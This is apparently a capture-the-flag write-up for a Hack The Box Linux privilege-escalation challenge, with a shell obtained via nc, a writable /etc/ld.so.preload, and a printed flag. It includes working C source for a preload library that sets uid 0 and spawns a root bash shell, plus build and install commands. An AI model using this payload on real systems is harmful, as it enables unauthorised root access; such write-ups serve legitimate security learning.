
![](https://cdn-images-1.medium.com/max/1000/1*sMftBGnGrTMnJNTQh6Bk0A.png)

#### Challenge Scenario

---

Push me, and then just touch me, till I can get my, Satisfaction!

wow,i know this song,maybe it is a chanlenge about robots

nc the target

![](https://cdn-images-1.medium.com/max/1000/1*ZnTprGAWuX6xKOenU5FHpQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*-g3Q28z-fvC1VXV-qb4HLQ.png)

it gives us a shell directly

so,rivilege escalation,right?

check the home 

![](https://cdn-images-1.medium.com/max/1000/1*Xzz6feZTo2G3SXSG3-fFew.png)

![](https://cdn-images-1.medium.com/max/1000/1*2OExN-0SNzvCKQPW1aTWmA.png)

yes，but we still need another part of key to find the way out

![](https://cdn-images-1.medium.com/max/1000/1*je8Y2Kzcd2YKnxQvcwqK0A.png)

After a long period of wandering and trial and error, we realised there wasn’t a key to the other half, but at that moment.

we found umask

![](https://cdn-images-1.medium.com/max/1000/1*FEfsLGaS3H2AmIEgIwwgkQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*2LpyF16Uq9yKdu_FPaHqOg.png)

wow

it become writable, So this challenge is no longer a challenge

here is the payload

### [/etc/ld.so.preload](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/write-to-root.html#etcldsopreload)

This file behaves like `**LD_PRELOAD**` env variable but it also works in **SUID binaries**.  
If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>

void _init() {  
    unlink("/etc/ld.so.preload");  
    setgid(0);  
    setuid(0);  
    system("/bin/bash");  
}  
//cd /tmp  
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles

  

![](https://cdn-images-1.medium.com/max/1000/1*wZf9IbErSGcBsAvkIziFPA.png)

than copy it to the target

ohh,too long

![](https://cdn-images-1.medium.com/max/1000/1*-rR7RDRMVe5Vjt__v3KPpA.png)

so

![](https://cdn-images-1.medium.com/max/1000/1*0Q7iHt4vKj3NcPWrf2rzwA.png)

echo -n ‘BASE64_PART_1’ >> 1.so.b64

echo -n ‘BASE64_PART_2’ >> 1.so.b64

and,finally we done

![](https://cdn-images-1.medium.com/max/1000/1*LxYAakLUM7l-9ezJOgvdjQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*vLEk5G9j-WKLdo6qEGQtcw.png)

last step here

![](https://cdn-images-1.medium.com/max/1000/1*t0zp3yTxteojc0mV9K-mRQ.png)

tips:you can check the size of .so to make sure it could work,because i really miss a lot of times.

![](https://cdn-images-1.medium.com/max/1000/1*4wvsOkLq3miTBS0qp72xPw.png)

![](https://cdn-images-1.medium.com/max/1000/1*TJR0U6X-dAHgPuJism34Hw.png)

than，

![](https://cdn-images-1.medium.com/max/1000/1*kgEgudtoriOuSeEDfCwK9Q.png)

![](https://cdn-images-1.medium.com/max/1000/1*CsNnREs30vZnr2aOuEe6Ng.png)

**_HTB{d75bdf6f50f17a639935792367e4788f}_**